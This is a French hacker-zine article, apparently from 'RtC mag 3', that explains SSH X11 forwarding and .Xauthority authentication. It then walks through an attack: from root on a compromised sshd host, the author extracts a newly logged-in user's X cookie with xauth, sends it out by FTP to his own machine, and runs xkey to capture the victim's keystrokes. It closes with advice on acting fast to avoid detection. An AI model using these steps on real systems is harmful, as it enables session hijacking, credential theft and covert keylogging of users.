@@ -1,0 +1,132 @@
+-------[  RtC Mag, At the end of the universe  ]
+
+--------------[  Pourquoi faire du X avec ssh ?  ]
+---------[ in RtC mag 3 ]
+----[  by Par4noID <rtcparanoid@yahoo.fr>  ]
+
+
+-------[  SSH et X11
+
+  a/ Je pense qu'il n'ait plus besoin de présenter SSH (secure shell) qui donne un classique remote shell securise (nous allons voir que tout est relatif). Le grand principe de ssh est de permettre une communication protégée (dans le sens ou elle est cryptée) qui évite de lacher les login/pass au premier sniffer venu (grand defaut de rlogin ou telnet). 
+
+  b/ Je pense ne pas avoir besoin non plus de rappeler le principe du serveur graphique X11 (sinon j crois qu'il y a un bon article de cod4 la dessus dans norouteX). Rappelons juste en gros les diverses méthodes d'identification de ce serveur:
+
+   * xhost: le serveur X11 possede une liste de controle d'acces, liste d'IP des ordinateurs ayant le droit de se connecter. Vous allez me dire "on va tout droit vers le spoof". Détrompez-vous! En general un acces xhost nous permet tout au plus d'afficher les sorties-ecran de nos process sur l'ecran de la victime (par un simple export DISPLAY=victim.com): Ca peut en faire rire certains mais niveau hack c pas vraiment le pied ;) (a part pour les capture d'ecran avec xwd).
+
+   * .Xauthority: les autres types d'identification repose sur les infos de ce fichier. Si vous possedez celles-ci, vous pouvez devenir client du serveur X11 de la victime; et cette fois-ci "un vrai client". J'entend par la que si vous possedez ce fichier vous partagez l'ecran de victime (avec tout ce que ca implique ;) ). 
+   
+   Vous l'aurez sans doute compris; notre but va être de recuperer ce fichier .Xauthority.
+
+   c/ Quel rapport existe-t-il en ssh et X11 ?
+
+C'est probablement la question que vous vous posez. Eh bien, la réponse est plutot simple. Pour sécuriser la connection, ssh va "proteger" la transmission des infos X. Ainsi ssh va cree ce que l'on nomme un secure channel non seulement pour vos echanges de donnees mais aussi pour les echanges de données X.
+Comment ca marche?
+
+Vous lancez votre client ssh et vous voulez vous connecter à un serveur ssh quelconque.
+
+1. le client ssh recupere les infos de votre .Xauthority pour pouvoir communiquer avec votre serveur X.
+
+    ---------------- 
+    |   serveur X   |
+    |               |
+    |               |
+    |               |
+    |   client ssh  |
+    |_______________|
+
+      votre machine
+
+2. Votre client ssh genere une valeur au hasard et l'envoie au serveur ssh.    
+
+    ----------------                                 -----------------
+    |   serveur X   |                                |     client X   |
+    |               |                                |                |
+    |               |  ------random valeur X-------> |                | 
+    |               |                                |                |
+    |   client ssh  |                                |   serveur ssh  | 
+    |_______________|                                |________________|
+
+      votre machine                           la machine qui fait tourner sshd
+
+3. Le serveur ssh cree un X proxy à partir de ces infos. Puis le serveur ssh associe cette valeur à un nombre affecté à une variable DISPLAY en placant cette valeur dans le .Xauthority (de la machine qui fait tourner sshd)
+
+    ----------------                                 -----------------
+    |   serveur X   |                                |     client X   |
+    |               |                                |                |
+    |               |                                |                | 
+    |               |                                |     X proxy    |
+    |   client ssh  |                                |   serveur ssh  | 
+    |_______________|                                |________________|
+
+      votre machine                           la machine qui fait tourner sshd
+
+4. La communication peut alors avoir lieu entre client/serveur X via le chemin suivant:
+
+    ----------------                                 -----------------
+    |   serveur X   |                                |     client X   |
+    |      ^        |                                |        ^       |
+    |      |        |                                |        |       | 
+    |      |        |      channel ssh securise      |     X proxy    |
+    |   client ssh  |--------------------------------|---serveur ssh  | 
+    |_______________|                                |________________|
+
+      votre machine                           la machine qui fait tourner sshd
+
+Quand le client X démarre, il observe la valeur de DISPLAY et se connecte au X proxy. Il extrait alors la valeur correspondante au display du .Xauthority et la présente au proxy. Ce dernier envoie alors l'authentificateur au client ssh qui fait la transcription et redirige le résultat sur le serveurX. 
+
+
+
+
+********* Bon, bon, bon : maintenant la prHAtiCK. 
+
+On se place en situation d'attaque. Vous venez de prendre le controle d'une machine distante nommé Xproxy (en root) mais elle ne vous suffit pas. 
+ 
+root@Xproxy# more /etc/inetd.conf
+
+...
+sshd .....
+...
+
+Yeah, elle fait tourner sshd. Bien c parti...
+On note la valeur du display.
+
+root@Xproxy# echo $DISPLAY
+Xproxy:4.0
+
+On regarde si par hasard quelqu'un d'autre ne serait pas connecter.
+
+root@Xproxy# who
+
+Bon personne... On attend
+
+root@Xproxy# who
+victim   p2  victim.dommage.org 6:24PM
+
+Tiens si... Quelqu'un vient de se connecter: la valeur de son DISPLAY est donc de 5. On chope le .Xauthority lui correspondant.
+
+root#xauth -f (home directory de victim)/.Xauthority extract ~/file proxy:5.0
+
+bien reste à se l'envoyer sur sa machine
+
+root@Xproxy# ftp Par4noID
+Connected to Par4noID
+220 RTC FTPserver ready.
+Name: RTC
+331 Password required for HackersGroup
+...
+
+root@Xproxy# exit
+
+Par4noID@localhost# xauth merge file
+Par4noID@localhost# xkey Xproxy.org:5.0
+
+et voila un joli shell....
+
+Problem que pose cette technique: si victim se deconnecte elle obtiendra:
+ The following connections are open: 
+X11 connection from Par4noID.le.hacker port X.
+
+Conclusion: Faites vite ou passer par un autre shell.
+
+
+-------[  EOF
